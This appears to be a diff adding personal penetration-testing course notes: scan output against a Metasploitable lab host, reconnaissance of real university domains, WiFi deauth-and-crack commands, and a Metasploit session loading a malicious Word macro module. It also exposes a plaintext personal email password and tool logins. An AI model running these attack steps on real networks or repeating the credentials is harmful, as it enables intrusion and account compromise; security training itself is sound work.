@@ -1,0 +1,1811 @@
+└─# nmap --script=ftp-anon.nse 192.168.103.139
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 02:25 EST
+Nmap scan report for 192.168.103.139
+Host is up (0.0015s latency).
+Not shown: 977 closed tcp ports (reset)
+PORT     STATE SERVICE
+21/tcp   open  ftp
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+22/tcp   open  ssh
+23/tcp   open  telnet
+25/tcp   open  smtp
+53/tcp   open  domain
+80/tcp   open  http
+111/tcp  open  rpcbind
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+512/tcp  open  exec
+513/tcp  open  login
+514/tcp  open  shell
+1099/tcp open  rmiregistry
+1524/tcp open  ingreslock
+2049/tcp open  nfs
+2121/tcp open  ccproxy-ftp
+3306/tcp open  mysql
+5432/tcp open  postgresql
+5900/tcp open  vnc
+6000/tcp open  X11
+6667/tcp open  irc
+8009/tcp open  ajp13
+8180/tcp open  unknown
+MAC Address: 00:0C:29:D1:EB:F4 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
+root㉿kali)-[/usr/share/nmap/scripts]
+
+https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip/download
+
+https://www.tenable.com/downloads/nessus?loginAttempted=true
+https://www.advanced-ip-scanner.com
+
+
+1.  Sign up on protonmail.com 2.Create an account on snov.io using protonmail.com
+https://account.proton.me/login
+bharaths91  username
+Nokia1234! password
+bharaths91@protonmail.com
+
+https://www.tenable.com/products/nessus/activation-code
+
+nessus: admin/admin123
+
+nikto -C all -h 192.168.20.188
+
+
+
+# nikto -C all -h 192.168.103.139
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.103.139
++ Target Hostname:    192.168.103.139
++ Target Port:        80
++ Start Time:         2023-03-04 05:22:46 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.8 (Ubuntu) DAV/2
++ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Uncommon header 'tcn' found, with contents: list
++ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ /phpinfo.php: Output from the phpinfo() function was found.
++ OSVDB-3268: /doc/: Directory indexing found.
++ OSVDB-48: /doc/: The /doc/ directory is browsable. This may be /usr/doc.
++ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-3092: /phpMyAdmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ Server may leak inodes via ETags, header found with file /phpMyAdmin/ChangeLog, inode: 92462, size: 40540, mtime: Tue Dec  9 12:24:00 2008
++ OSVDB-3092: /phpMyAdmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ OSVDB-3268: /test/: Directory indexing found.
++ OSVDB-3092: /test/: This might be interesting...
++ OSVDB-3233: /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /phpMyAdmin/: phpMyAdmin directory found
++ OSVDB-3092: /phpMyAdmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ OSVDB-3092: /phpMyAdmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ 26523 requests: 0 error(s) and 27 item(s) reported on remote host
++ End Time:           2023-03-04 05:23:58 (GMT-5) (72 seconds)
+---------------------------------------------------------------------------
+OWASP:
+===
+https://sourceforge.net/projects/owaspbwa/
+https://www.cvedetails.com/vulnerability-list/cvssscoremin-9/cvssscoremax-10/vulnerabilities.html
+
+┌──(root㉿kali)-[~]
+└─# whatweb http://testphp.vulnweb.com
+http://testphp.vulnweb.com [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]
+                                                                                                                                                                                                                   
+┌──(root㉿kali)-[~]
+
+--------------------------------------------------------------------------------------
++ 1 host(s) tested
+                                                                                                                                                                                                                   
+┌──(root㉿kali)-[/usr/share/nmap/scripts]
+└─# 
+https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
+https://download.sysinternals.com/files/SysinternalsSuite.zip
+
+4th to 10th --- DUMP---1 week
+11th to 15th --- CHFI notes----1 week
+15th to 24th --- UDEMy--1 day
+24th to 30 revision
+===================================================================================================
+─(root㉿kali)-[~]
+└─# crunch       
+crunch version 3.6
+
+Crunch can create a wordlist based on criteria you specify.  The output from crunch can be sent to the screen, file, or to another program.
+
+Usage: crunch <min> <max> [options]
+where min and max are numbers
+
+Please refer to the man page for instructions and examples on how to use crunch.
+                                                                                                                                                                                                                  
+┌──(root㉿kali)-[~]
+└─# crunch 3 6 > 1.txt
+Crunch will now generate the following amount of data: 2236053872 bytes
+2132 MB
+2 GB
+0 TB
+0 PB
+Crunch will now generate the following number of lines: 321271704 
+
+
+EXAMPLES
+       Example 1
+       crunch 1 8
+       crunch will display a wordlist that starts at a and ends at zzzzzzzz
+
+       Example 2
+       crunch 1 6 abcdefg
+       crunch will display a wordlist using the character set abcdefg that starts at a and ends at gggggg
+
+       Example 3
+       crunch 1 6 abcdefg\
+       there is a space at the end of the character string.  In order for crunch to use the space you will need to escape it using the \ character.  In this example  you  could  also
+       put quotes around the letters and not need the \, i.e. "abcdefg ".  Crunch will display a wordlist using the character set abcdefg  that starts at a and ends at (6 spaces)
+
+       Example 4
+       crunch 1 8 -f charset.lst mixalpha-numeric-all-space -o wordlist.txt
+       crunch  will  use  the  mixalpha-numeric-all-space character set from charset.lst and will write the wordlist to a file named wordlist.txt.  The file will start with a and end
+       with "        "
+
+       Example 5
+       crunch 8 8 -f charset.lst mixalpha-numeric-all-space -o wordlist.txt -t @@dog@@@ -s cbdogaaa
+       crunch should generate a 8 character wordlist using the mixalpha-number-all-space character set from charset.lst and will write the wordlist to a file named wordlist.txt.  The
+       file will start at cbdogaaa and end at "  dog   "
+
+       Example 6
+       crunch 2 3 -f charset.lst ualpha -s BB
+       crunch  with  start generating a wordlist at BB and end with ZZZ.  This is useful if you have to stop generating a wordlist in the middle.  Just do a tail wordlist.txt and set
+       the -s parameter to the next word in the sequence.  Be sure to rename the original wordlist BEFORE you begin as crunch will overwrite the existing wordlist.
+
+       Example 7
+       crunch 4 5 -p abc
+       The numbers aren't processed but are needed.
+       crunch will generate abc, acb, bac, bca, cab, cba.
+
+       Example 8
+       crunch 4 5 -p dog cat bird
+       The numbers aren't processed but are needed.
+       crunch will generate birdcatdog, birddogcat, catbirddog, catdogbird, dogbird
+
+wIRELSS PASSWORD cRACK:
+========================
+
+https://www.amazon.in/Alfa-AWUS036NHA-150Mbps-Wireless-Adaptor/dp/B004Y6MIXS
+
+Enterprise Security:  802.11 EAX 
+
+Gaining access to a wifi router 
+
+1.airmon-ng start wlan0 it puts our NIC into monitor mode
+2.airodump-ng wlanmon0 : Discover the wifi networks
+3.airodump-ng --bssid 08:86:30:74:22:76 -c 6 -w path of capture file wlanmon0 : Target the particular router
+–bssid : mac of router 
+-c : Channel number
+-w : wher to write the file.
+
+
+4.aireplay-ng --deauth  100 -a 08:86:30:74:22:76 wlanmon0 : deauth attack
+
+
+
+5. aircrack-ng -w password list capture file  : Cracking the password
+
+
+https://en.wikipedia.org/wiki/ESP8266  ###iTS A jAMMER
+
+
+====================================================================================
+https://www.wifislax.com  -- OS 
+https://github.com/wifiphisher/wifiphisher
+https://github.com/M31MOTH/fluxion-2
+
+https://www.netresec.com/?page=NetworkMiner
+
+================================================================
+
+Mobile Phone:
+https://start.me/p/OmxRqE/mobile
+https://github.com/sh4hin/Androl4b
+
+http://testphp.vulnweb.com/userinfo.php
+
+============================================
+
+─# nc -zv 192.168.103.139 21-100      
+192.168.103.139: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.103.139] 80 (http) open
+(UNKNOWN) [192.168.103.139] 22 (ssh) open
+                                                                                                                                                                                                                   
+┌──(root㉿kali)-[~]
+└─# nc -zv 192.168.103.139 21-200
+192.168.103.139: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.103.139] 143 (imap2) open
+(UNKNOWN) [192.168.103.139] 139 (netbios-ssn) open
+(UNKNOWN) [192.168.103.139] 80 (http) open
+(UNKNOWN) [192.168.103.139] 22 (ssh) open
+                                                                                                                                                                                                                   
+┌──(root㉿kali)-[~]
+└─# 
+
+===============================
+
+https://www.hacksplaining.com ### Try learn Hacking
+
+[04-03 13:26] Karan Trainer (Guest)
+
+
+https://www.advanced-ip-scanner.com
+https://www.tenable.com/downloads/nessus?loginAttempted=true
+
+
+
+cpent:
+===================================================================================================================================================================================
+https://www.stationx.net/nmap-cheat-sheet/
+
+https://ilabs.eccouncil.org/
+
+https://eccouncil.learnondemand.net
+
+
+sudo openvpn <vpn name>>
+ifconfig -a ##shows tun0
+
+
+HSBox 1: https://drive.google.com/file/d/106nJaQ34aM1i1d2fyyHzN4WJkSb1AEM0/view?usp=sharing
+
+HSBox 2: https://drive.google.com/file/d/1ZbcJWz4w8rz0RnVW61EP6u73Mk6hBvP6/view?usp=sharing
+HSBox 3: https://drive.google.com/file/d/1S4bfOzcB23snHbnz4RjNum4s3ISWxdjc/view?usp=sharing
+HSvBox1: https://drive.google.com/file/d/1I_WCTJcYFlDD3oiwCGi-6NF9N6UEagZa/view?usp=share_link Login - muggle:muggle
+HSvBox2: https://drive.google.com/file/d/1RmQWJEyT8aoI7WKIqvz1cY56qRXYR7m6/view?usp=share_link Login - muggle:muggle
+
+
+wappalizer addons on Firefox shows type of technology it is using.
+https://osintframework.com/  ###for recon
+
+
+https://www.iare.ac.in/Induction_Program_2019.pdf
+
+==========================metagoofil===============================
+
+─# metagoofil -d iare.ac.in -l 10  -o sample -t pdf,docx
+[*] Searching for 10 .pdf files and waiting 30.0 seconds between searches
+[*] Results: 10 .pdf files found
+https://iare.ac.in/FDP_Brochure.pdf
+https://www.iare.ac.in/Welcome_to_IARE_newly_admitted_students.pdf
+https://www.iare.ac.in/IARE_Brochure_2018.pdf
+https://www.iare.ac.in/Induction_Program_2019.pdf
+https://www.iare.ac.in/IARE_2020_Brochure.pdf
+https://www.iare.ac.in/CSR_RANKING_2018.pdf
+https://www.iare.ac.in/ccsn2019.pdf
+https://www.iare.ac.in/images/ISO_Certificate_Safety_Management_22000_2018.pdf
+https://iare.ac.in/sites/default/files/NAACSSR.pdf
+https://iare.ac.in/sites/default/files/IARE_Dean_Order_Letters.pdf
+[*] Searching for 10 .docx files and waiting 30.0 seconds between searches
+[*] Results: 10 .docx files found
+https://www.iare.ac.in/sites/default/files/downloads/IARE_Invention_Disclosure_Form.docx
+https://iare.ac.in/sites/default/files/IQAC/templates/COURSE_Defintion_Terminology.docx
+https://www.iare.ac.in/sites/default/files/news/ProposalFormat_Call_for_InnovativeSolutions_to_LocalProblems.docx
+https://www.iare.ac.in/sites/default/files/news/SIPP_Application_Format.docx
+https://iare.ac.in/sites/default/files/IQAC/templates/Quality_Objective_Parameters.docx
+https://www.iare.ac.in/sites/default/files/downloads/Utilization_Certificate.docx
+https://iare.ac.in/sites/default/files/IQAC/templates/STUDENT_NOMINAL_ROLLS.docx
+https://iare.ac.in/sites/default/files/IQAC/templates/COURSE_Concept_Video_Topics.docx
+https://iare.ac.in/sites/default/files/IQAC/templates/COURSE_Open_Ended_Experiments.docx
+https://iare.ac.in/sites/default/files/IQAC/templates/COURSE_Tech_Talk_Topics.docx
+[+] Done!
+
+
+=========================Harvester=============
+                                                                                                                                            
+┌──(root㉿kali)-[/home]
+└─# theHarvester -d race.reva.edu.in -b all
+*******************************************************************
+*  _   _                                            _             *
+* | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *
+* | __|  _ \ / _ \  / /_/ / _` | '__\ \ / / _ \/ __| __/ _ \ '__| *
+* | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *
+*  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *
+*                                                                 *
+* theHarvester 4.2.0                                              *
+* Coded by Christian Martorella                                   *
+* Edge-Security Research                                          *
+* cmartorella@edge-security.com                                   *
+*                                                                 *
+*******************************************************************
+
+[*] Target: race.reva.edu.in 
+
+
+[!] Missing API key for binaryedge. 
+
+[!] Missing API key for Censys ID and/or Secret. 
+
+[!] Missing API key for fullhunt. 
+
+[!] Missing API key for Github. 
+
+[!] Missing API key for Hunter. 
+
+[!] Missing API key for Intelx. 
+
+[!] Missing API key for PentestTools. 
+
+[!] Missing API key for ProjectDiscovery. 
+
+[!] Missing API key for RocketReach. 
+
+[!] Missing API key for Securitytrail. 
+
+[!] Missing API key for virustotal. 
+
+[!] Missing API key for zoomeye. 
+An exception has occurred: Cannot serialize non-str key None
+An exception has occurred: Cannot connect to host www.baidu.com:443 ssl:<ssl.SSLContext object at 0x7fb3b426b740> [Connection reset by peer]
+An exception has occurred: Cannot connect to host wappass.baidu.com:443 ssl:<ssl.SSLContext object at 0x7fb3b426b940> [Connection reset by peer]
+An exception has occurred: Cannot connect to host wappass.baidu.com:443 ssl:<ssl.SSLContext object at 0x7fb3b42b4ac0> [Connection reset by peer]
+[*] Searching Anubis. 
+An exception has occurred: Cannot connect to host wappass.baidu.com:443 ssl:<ssl.SSLContext object at 0x7fb3b426a940> [Connection reset by peer]                                                                                                                                            
+An exception has occurred: Cannot connect to host wappass.baidu.com:443 ssl:<ssl.SSLContext object at 0x7fb3b426be40> [Connection reset by peer]                                                                                                                                            
+        Searching 0 results.                                                                                                                  
+[*] Searching Bing.                                                                                                                           
+An exception has occurred: Cannot connect to host dns.bufferover.run:443 ssl:<ssl.SSLContext object at 0x7fb3b4199940> [Name or service not known]                                                                                                                                          
+[*] Searching Baidu.                                                                                                                          
+        Searching results.                                                                                                                    
+[*] Searching Certspotter.                                                                                                                    
+[*] Searching Duckduckgo.                                                                                                                     
+[*] Searching CRTsh.                                                                                                                          
+[*] Searching Dnsdumpster.                                                                                                                    
+[*] Searching Hackertarget.                                                                                                                   
+[*] Searching Otx.                                                                                                                            
+[*] Searching Qwant.                                                                                                                          
+[*] Searching Rapiddns.                                                                                                                       
+An exception has occurred: Cannot connect to host www.threatcrowd.org:443 ssl:True [SSLCertVerificationError: (1, "[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Hostname mismatch, certificate is not valid for 'www.threatcrowd.org'. (_ssl.c:997)")]                       
+string indices must be integers                                                                                                               
+[*] Searching Threatcrowd.                                                                                                                    
+An exception has occurred: 0, message='Attempt to decode JSON with unexpected mimetype: text/html; charset=utf-8', url=URL('https://api.threatminer.org/v2/domain.php?q=race.reva.edu.in&rt=5')                                                                                             
+[*] Searching Urlscan.                                                                                                                        
+An exception has occurred: 0, message='Attempt to decode JSON with unexpected mimetype: text/html; charset=utf-8', url=URL('https://sonar.omnisint.io/all/race.reva.edu.in?page=1')                                                                                                         
+[*] Searching Omnisint.                                                                                                                       
+An exception has occurred: 0, message='Attempt to decode JSON with unexpected mimetype: text/html; charset=utf-8', url=URL('https://api.sublist3r.com/search.php?domain=race.reva.edu.in')                                                                                                  
+[*] Searching Sublist3r.                                                                                                                      
+                                                                                                                                              
+[*] LinkedIn Links found: 0                                                                                                                   
+---------------------                                                                                                                         
+                                                                                                                                              
+[*] IPs found: 5                                                                                                                              
+-------------------                                                                                                                           
+13.235.187.158                                                                                                                                
+35.154.156.142                                                                                                                                
+52.66.116.194                                                                                                                                 
+104.21.29.241                                                                                                                                 
+172.67.149.254                                                                                                                                
+                                                                                                                                              
+[*] No emails found.                                                                                                                          
+                                                                                                                                              
+[*] Hosts found: 2                                                                                                                            
+---------------------                                                                                                                         
+www.race.reva.edu.in                                                                                                                          
+                                                                                                                                              
+┌──(root㉿kali)-[/home]
+└─# 
+
+==============================================exiftool=================================================
+─# exiftool reeCFrCx.html
+ifTool Version Number         : 12.55
+File Name                       : reeCFrCx.html
+Directory                       : .
+File Size                       : 1062 bytes
+File Modification Date/Time     : 2023:01:28 07:49:56-05:00
+File Access Date/Time           : 2023:01:28 07:49:56-05:00
+File Inode Change Date/Time     : 2023:01:28 07:49:56-05:00
+File Permissions                : -rw-r--r--
+File Type                       : HTML
+File Type Extension             : html
+MIME Type                       : text/html
+Pragma                          : NO-CACHE
+Cache Control                   : NO-CACHE
+Title                           : Metasploit screenshare - 192.168.103.254
+                                                                                                                                                                                                           
+┌──(root㉿kali)-[~]
+└─# exiftool index.txt    
+ExifTool Version Number         : 12.55
+File Name                       : index.txt
+Directory                       : .
+File Size                       : 16 kB
+File Modification Date/Time     : 2023:01:28 04:02:02-05:00
+File Access Date/Time           : 2023:01:28 07:43:01-05:00
+File Inode Change Date/Time     : 2023:01:28 07:44:32-05:00
+File Permissions                : -rw-r--r--
+File Type                       : TXT
+File Type Extension             : txt
+MIME Type                       : text/plain
+MIME Encoding                   : us-ascii
+Newlines                        : Unix LF
+Line Count                      : 17
+Word Count                      : 379
+====================================================================
+
+msf6 > 
+msf6 > search office
+
+Matching Modules
+================
+
+   #   Name                                                       Disclosure Date  Rank       Check  Description
+   -   ----                                                       ---------------  ----       -----  -----------
+   0   exploit/multi/misc/openoffice_document_macro               2017-02-08       excellent  No     Apache OpenOffice Text Document Malicious Macro Execution
+   1   exploit/windows/http/avaya_ccr_imageupload_exec            2012-06-28       excellent  No     Avaya IP Office Customer Call Reporter ImageUpload.ashx Remote Command Execution
+   2   exploit/windows/fileformat/djvu_imageurl                   2008-10-30       low        No     DjVu DjVu_ActiveX_MSOffice.dll ActiveX ComponentBuffer Overflow
+   3   auxiliary/scanner/msmail/exchange_enum                     2018-11-06       normal     No     Exchange email enumeration
+   4   auxiliary/scanner/http/frontpage_login                                      normal     No     FrontPage Server Extensions Anonymous Login Scanner
+   5   exploit/linux/misc/hp_jetdirect_path_traversal             2017-04-05       normal     No     HP Jetdirect Path Traversal Arbitrary Code Execution
+   6   auxiliary/fileformat/odt_badodt                            2018-05-01       normal     No     LibreOffice 6.03 /Apache OpenOffice 4.1.5 Malicious ODT File Generator
+   7   exploit/multi/fileformat/libreoffice_macro_exec            2018-10-18       normal     No     LibreOffice Macro Code Execution
+   8   exploit/multi/fileformat/libreoffice_logo_exec             2019-07-16       normal     No     LibreOffice Macro Python Code Execution
+   9   exploit/windows/fileformat/ms09_067_excel_featheader       2009-11-10       good       No     MS09-067 Microsoft Excel Malformed FEATHEADER Record Vulnerability
+   10  exploit/windows/fileformat/ms10_004_textbytesatom          2010-02-09       good       No     MS10-004 Microsoft PowerPoint Viewer TextBytesAtom Stack Buffer Overflow
+   11  exploit/windows/fileformat/ms10_087_rtf_pfragments_bof     2010-11-09       great      No     MS10-087 Microsoft Word RTF pFragments Stack Buffer Overflow (File Format)
+   12  exploit/windows/misc/ms10_104_sharepoint                   2010-12-14       excellent  Yes    MS10-104 Microsoft Office SharePoint Server 2007 Remote Code Execution
+   13  exploit/windows/fileformat/ms11_006_createsizeddibsection  2010-12-15       great      No     MS11-006 Microsoft Windows CreateSizedDIBSECTION Stack Buffer Overflow
+   14  exploit/windows/fileformat/ms11_021_xlb_bof                2011-08-09       normal     No     MS11-021 Microsoft Office 2007 Excel .xlb Buffer Overflow
+   15  exploit/windows/fileformat/ms10_038_excel_obj_bof          2010-06-08       normal     No     MS11-038 Microsoft Office Excel Malformed OBJ Record Handling Overflow
+   16  exploit/windows/fileformat/ms12_005                        2012-01-10       excellent  No     MS12-005 Microsoft Office ClickOnce Unsafe Object Package Handling Vulnerability
+   17  exploit/windows/fileformat/ms12_027_mscomctl_bof           2012-04-10       average    No     MS12-027 MSCOMCTL ActiveX Buffer Overflow
+   18  exploit/windows/browser/ie_setmousecapture_uaf             2013-09-17       normal     No     MS13-080 Microsoft Internet Explorer SetMouseCapture Use-After-Free
+   19  exploit/windows/fileformat/mswin_tiff_overflow             2013-11-05       average    No     MS13-096 Microsoft Tagged Image File Format (TIFF) Integer Overflow
+   20  exploit/windows/fileformat/ms14_017_rtf                    2014-04-01       normal     No     MS14-017 Microsoft Word RTF Object Confusion
+   21  exploit/windows/fileformat/ms14_060_sandworm               2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
+   22  exploit/windows/fileformat/ms14_064_packager_run_as_admin  2014-10-21       excellent  No     MS14-064 Microsoft Windows OLE Package Manager Code Execution
+   23  exploit/windows/fileformat/ms14_064_packager_python        2014-11-12       excellent  No     MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python
+   24  exploit/windows/http/manageengine_appmanager_exec          2018-03-07       excellent  Yes    ManageEngine Applications Manager Remote Code Execution
+   25  exploit/windows/fileformat/office_excel_slk                2018-10-07       manual     No     Microsoft Excel .SLK Payload Delivery
+   26  exploit/windows/http/exchange_ecp_dlp_policy               2021-01-12       excellent  Yes    Microsoft Exchange Server DlpUtils AddTenantDlpPolicy RCE
+   27  exploit/windows/browser/ms09_043_owc_htmlurl               2009-08-11       normal     No     Microsoft OWC Spreadsheet HTMLURL Buffer Overflow
+   28  exploit/windows/browser/ms09_043_owc_msdso                 2009-07-13       normal     No     Microsoft OWC Spreadsheet msDataSourceObject Memory Corruption
+   29  exploit/windows/fileformat/office_ms17_11882               2017-11-15       manual     No     Microsoft Office CVE-2017-11882
+   30  exploit/windows/fileformat/office_dde_delivery             2017-10-09       manual     No     Microsoft Office DDE Payload Delivery
+   31  exploit/windows/fileformat/visio_dxf_bof                   2010-05-04       good       No     Microsoft Office Visio VISIODWG.DLL DXF File Handling Vulnerability
+   32  exploit/windows/fileformat/word_msdtjs_rce                 2022-05-29       excellent  No     Microsoft Office Word MSDTJS
+   33  exploit/windows/fileformat/office_word_hta                 2017-04-14       excellent  No     Microsoft Office Word Malicious Hta Execution
+   34  exploit/windows/fileformat/word_mshtml_rce                 2021-09-23       excellent  No     Microsoft Office Word Malicious MSHTML RCE
+   35  exploit/multi/fileformat/office_word_macro                 2012-01-10       excellent  No     Microsoft Office Word Malicious Macro Execution
+   36  auxiliary/server/netbios_spoof_nat                         2016-06-14       normal     No     NetBIOS Response "BadTunnel" Brute Force Spoof (NAT Tunnel)
+   37  auxiliary/scanner/http/groupwise_agents_http_traversal                      normal     No     Novell Groupwise Agents HTTP Directory Traversal
+   38  auxiliary/gather/office365userenum                         2018-09-05       normal     No     Office 365 User Enumeration
+   39  exploit/windows/fileformat/office_ole_multiple_dll_hijack  2015-12-08       normal     No     Office OLE Multiple DLL Side Loading Vulnerabilities
+   40  post/windows/gather/enum_onedrive                                           normal     No     OneDrive Sync Provider Enumeration Module
+   41  exploit/windows/fileformat/openoffice_ole                  2008-04-17       normal     No     OpenOffice OLE Importer DocumentSummaryInformation Stream Handling Overflow
+   42  exploit/windows/browser/ms08_041_snapshotviewer            2008-07-07       excellent  No     Snapshot Viewer for Microsoft Access ActiveX Control Arbitrary File Download
+   43  exploit/windows/browser/trendmicro_officescan              2007-02-12       normal     No     Trend Micro OfficeScan Client ActiveX Control Buffer Overflow
+   44  exploit/windows/http/trendmicro_officescan_widget_exec     2017-10-07       excellent  Yes    Trend Micro OfficeScan Remote Code Execution
+   45  exploit/windows/http/trendmicro_officescan                 2007-06-28       good       No     Trend Micro OfficeScan Remote Stack Buffer Overflow
+   46  auxiliary/admin/officescan/tmlisten_traversal                               normal     No     TrendMicro OfficeScanNT Listener Traversal Arbitrary File Access
+   47  exploit/windows/browser/ultraoffice_httpupload             2008-08-27       good       No     Ultra Shareware Office Control ActiveX HttpUpload Buffer Overflow
+   48  post/windows/gather/dumplinks                                               normal     No     Windows Gather Dump Recent Files lnk Info
+   49  post/windows/gather/enum_trusted_locations                                  normal     No     Windows Gather Microsoft Office Trusted Locations
+   50  post/windows/gather/word_unc_injector                                       normal     No     Windows Gather Microsoft Office Word UNC Path Injector
+   51  post/windows/gather/outlook                                                 normal     No     Windows Gather Outlook Email Messages
+   52  auxiliary/fileformat/multidrop                                              normal     No     Windows SMB Multi Dropper
+
+
+Interact with a module by name or index. For example info 52, use 52 or use auxiliary/fileformat/multidrop
+
+msf6 > search office word
+
+Matching Modules
+================
+
+   #   Name                                                    Disclosure Date  Rank       Check  Description
+   -   ----                                                    ---------------  ----       -----  -----------
+   0   exploit/windows/fileformat/ms10_087_rtf_pfragments_bof  2010-11-09       great      No     MS10-087 Microsoft Word RTF pFragments Stack Buffer Overflow (File Format)
+   1   exploit/windows/fileformat/ms12_005                     2012-01-10       excellent  No     MS12-005 Microsoft Office ClickOnce Unsafe Object Package Handling Vulnerability
+   2   exploit/windows/fileformat/mswin_tiff_overflow          2013-11-05       average    No     MS13-096 Microsoft Tagged Image File Format (TIFF) Integer Overflow
+   3   exploit/windows/fileformat/ms14_017_rtf                 2014-04-01       normal     No     MS14-017 Microsoft Word RTF Object Confusion
+   4   exploit/windows/fileformat/office_dde_delivery          2017-10-09       manual     No     Microsoft Office DDE Payload Delivery
+   5   exploit/windows/fileformat/word_msdtjs_rce              2022-05-29       excellent  No     Microsoft Office Word MSDTJS
+   6   exploit/windows/fileformat/office_word_hta              2017-04-14       excellent  No     Microsoft Office Word Malicious Hta Execution
+   7   exploit/windows/fileformat/word_mshtml_rce              2021-09-23       excellent  No     Microsoft Office Word Malicious MSHTML RCE
+   8   exploit/multi/fileformat/office_word_macro              2012-01-10       excellent  No     Microsoft Office Word Malicious Macro Execution
+   9   auxiliary/gather/office365userenum                      2018-09-05       normal     No     Office 365 User Enumeration
+   10  post/windows/gather/word_unc_injector                                    normal     No     Windows Gather Microsoft Office Word UNC Path Injector
+
+
+Interact with a module by name or index. For example info 10, use 10 or use post/windows/gather/word_unc_injector
+
+msf6 > search office word rank: excellent
+[-] No results from search
+msf6 > search office word rank:excellent
+
+Matching Modules
+================
+
+   #  Name                                        Disclosure Date  Rank       Check  Description
+   -  ----                                        ---------------  ----       -----  -----------
+   0  exploit/windows/fileformat/ms12_005         2012-01-10       excellent  No     MS12-005 Microsoft Office ClickOnce Unsafe Object Package Handling Vulnerability
+   1  exploit/windows/fileformat/word_msdtjs_rce  2022-05-29       excellent  No     Microsoft Office Word MSDTJS
+   2  exploit/windows/fileformat/office_word_hta  2017-04-14       excellent  No     Microsoft Office Word Malicious Hta Execution
+   3  exploit/windows/fileformat/word_mshtml_rce  2021-09-23       excellent  No     Microsoft Office Word Malicious MSHTML RCE
+   4  exploit/multi/fileformat/office_word_macro  2012-01-10       excellent  No     Microsoft Office Word Malicious Macro Execution
+
+
+Interact with a module by name or index. For example info 4, use 4 or use exploit/multi/fileformat/office_word_macro
+
+msf6 > use exploit/multi/fileformat/office_word_macro
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(multi/fileformat/office_word_macro) > info
+
+       Name: Microsoft Office Word Malicious Macro Execution
+     Module: exploit/multi/fileformat/office_word_macro
+   Platform: 
+       Arch: 
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2012-01-10
+
+Provided by:
+  sinn3r <sinn3r@metasploit.com>
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Microsoft Office Word on Windows
+  1   Microsoft Office Word on Mac OS X (Python)
+
+Check supported:
+  No
+
+Basic options:
+  Name            Current Setting  Required  Description
+  ----            ---------------  --------  -----------
+  CUSTOMTEMPLATE                   no        A docx file that will be used as a template to build the exploit
+  FILENAME        msf.docm         yes       The Office document macro file (docm)
+
+Payload information:
+
+Description:
+  This module injects a malicious macro into a Microsoft Office Word 
+  document (docx). The comments field in the metadata is injected with 
+  a Base64 encoded payload, which will be decoded by the macro and 
+  execute as a Windows executable. For a successful attack, the victim 
+  is required to manually enable macro execution.
+
+References:
+  https://en.wikipedia.org/wiki/Macro_virus
+
+
+View the full module info with the info -d command.
+
+msf6 exploit(multi/fileformat/office_word_macro) > show optioms
+[-] Invalid parameter "optioms", use "show -h" for more information
+msf6 exploit(multi/fileformat/office_word_macro) > show options
+
+Module options (exploit/multi/fileformat/office_word_macro):
+
+   Name            Current Setting  Required  Description
+   ----            ---------------  --------  -----------
+   CUSTOMTEMPLATE                   no        A docx file that will be used as a template to build the exploit
